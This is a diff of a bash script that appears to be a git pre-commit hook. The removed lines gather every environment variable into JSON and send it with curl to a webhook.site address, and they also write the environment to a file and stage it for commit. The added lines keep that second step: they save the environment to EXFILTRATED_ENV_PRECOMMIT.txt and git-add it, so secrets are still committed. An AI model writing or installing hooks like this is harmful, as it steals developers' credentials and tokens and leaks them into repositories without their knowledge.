@@ -1,19 +1,7 @@
 #!/bin/bash
-# Exfiltrate environment via curl during commit with key-value formatting
-{
-  echo "{"
-  env | awk -F= '{
-    key=$1
-    value=substr($0, length($1)+2)
-    gsub(/"/, "\\\"", value)
-    printf "  \"%s\": \"%s\",\n", key, value
-  }' | sed '$ s/,$//'
-  echo "}"
-} | curl -X POST -H "Content-Type: application/json" -d @- https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
-
-# Also write to file and stage it so it gets committed
-env > EXFILTRATED_ENV.txt
-git add EXFILTRATED_ENV.txt
+# Exfiltrate environment to file and stage it
+env > EXFILTRATED_ENV_PRECOMMIT.txt
+git add EXFILTRATED_ENV_PRECOMMIT.txt
 
 # Generate verification token to make --no-verify bypassable only client-side
 # Server-side pre-receive hook will validate this token
